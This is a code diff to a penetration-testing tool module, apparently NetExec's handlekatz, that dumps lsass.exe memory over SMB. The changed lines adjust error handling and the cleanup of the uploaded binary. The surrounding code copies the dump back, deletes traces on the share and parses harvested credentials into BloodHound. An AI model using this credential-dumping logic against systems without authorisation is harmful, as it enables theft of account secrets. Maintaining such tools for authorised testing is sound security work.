@@ -97,12 +97,15 @@ class NXCModule:
             context.log.fail("Process lsass.exe error un dump, try with verbose")
             dump = False
 
-        if dump:
+        if not dump:
+            self.delete_handlekatz_binary(connection, context)
+            return
+        else:
             regex = r"([A-Za-z0-9-]*\.log)"
             matches = re.search(regex, str(p), re.MULTILINE)
             if not matches:
                 context.log.display("Error getting the lsass.dmp file name")
-                sys.exit(1)
+                return
 
             machine_name = matches.group()
             context.log.display(f"Copy {machine_name} to host")
@@ -115,7 +118,6 @@ class NXCModule:
                     context.log.fail(f"Error while get file: {e}")
 
             self.delete_handlekatz_binary()
-
             try:
                 connection.conn.deleteFile(self.share, self.tmp_share + machine_name)
                 context.log.success(f"Deleted lsass.dmp file on the {self.share} share")
@@ -179,9 +181,6 @@ class NXCModule:
                         add_user_bh(credz_bh, None, context.log, connection.config)
                 except Exception as e:
                     context.log.fail(f"Error opening dump file: {e}")
-
-        else:
-            self.delete_handlekatz_binary(connection, context)
 
     def delete_handlekatz_binary(self, connection, context):
         try:
